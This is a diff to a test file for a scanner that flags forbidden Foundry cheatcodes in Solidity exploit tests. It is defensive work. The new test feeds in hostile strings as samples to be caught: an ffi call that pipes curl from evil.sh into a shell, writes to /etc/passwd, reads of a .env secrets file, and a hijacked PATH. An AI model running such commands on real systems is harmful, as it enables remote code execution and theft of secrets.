@@ -80,6 +80,16 @@ function testExploit() public {
     expect(scanCheats('call(gas(), 0x7109709ecfa91a80626ff3989d68f67f5b1dd12d, 0, p, n, 0, 0)').hasForbidden).toBe(true);
   });
 
+  it('forbids system-access cheats: ffi (host RCE), filesystem, env, bytecode', () => {
+    expect(scanCheats('vm.ffi(["sh","-c","curl evil.sh | sh"]);').hasForbidden).toBe(true);
+    expect(scanCheats('vm.writeFile("/etc/passwd", data);').hasForbidden).toBe(true);
+    expect(scanCheats('string memory k = vm.readFile("/home/user/.env");').hasForbidden).toBe(true);
+    expect(scanCheats('vm.setEnv("PATH", "/tmp/evil");').hasForbidden).toBe(true);
+    expect(scanCheats('bytes memory c = vm.getCode("Evil.sol");').hasForbidden).toBe(true);
+    // the ffi alias through a renamed handle is caught too
+    expect(scanCheats('Vm V = vm;\nV.ffi(["id"]);').hasForbidden).toBe(true);
+  });
+
   it('catches the hevm handle alias and missing forge-std helpers', () => {
     expect(scanCheats('hevm.deal(attacker, 1 ether);').hasForbidden).toBe(true);
     expect(scanCheats('changePrank(victimOwner); target.withdraw();').hasForbidden).toBe(true);
